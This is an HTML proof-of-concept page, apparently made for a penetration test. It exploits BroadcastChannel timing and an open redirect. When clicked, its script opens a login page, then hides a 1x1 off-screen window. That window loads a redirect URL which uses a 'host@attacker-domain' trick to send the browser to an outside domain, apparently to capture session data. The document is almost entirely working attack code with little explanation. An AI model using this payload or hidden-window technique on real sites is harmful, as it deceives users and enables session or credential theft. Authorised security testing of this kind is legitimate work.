<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>BroadcastChannel Attack PoC</title>
</head>
<body>
    <h1>BroadcastChannel PoC</h1>
    <p>This page will try to exploit BroadcastChannel timing.</p>

    <a href="javascript:void(0)" onclick="openTabs()">Click to start</a>

    <script>
        function openTabs() {
            // Step 1: Open login page first (visible tab)
            const loginWindow = window.open(
                "https://pentest.cdd.io/user/session/new",
                "_blank"
            );

            // Step 2: After 3 seconds, open the redirect attack page (hidden tab)
            setTimeout(() => {
                const redirectWindow = window.open(
                    "https://pentest.cdd.io/?redirect_url=https%3A%2F%2Fpentest.cdd.io%40daemoon.me",
                    "_blank",
                    "width=1,height=1,left=-1000,top=-1000" // hide it
                );
            }, 3000);
        }
    </script>
</body>
</html>
